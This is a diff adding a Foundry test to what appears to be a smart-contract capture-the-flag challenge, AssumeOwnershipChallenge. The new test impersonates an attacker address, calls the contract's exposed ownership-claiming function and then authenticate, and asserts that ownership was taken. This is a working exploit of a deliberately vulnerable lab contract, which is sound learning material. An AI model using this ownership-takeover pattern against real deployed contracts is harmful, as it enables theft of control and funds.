@@ -12,4 +12,11 @@ contract AssumeOwnerShipTest is Test {
     function setUp() public {
         assumeOwnership = new AssumeOwnershipChallenge();
     }
+
+    function testAssumeOwnershipExploit() public {
+        vm.startPrank(h3x0r);
+        assumeOwnership.assumeOwnership();
+        assumeOwnership.authenticate();
+        assertEq(assumeOwnership.owner(), h3x0r);
+    }
 }
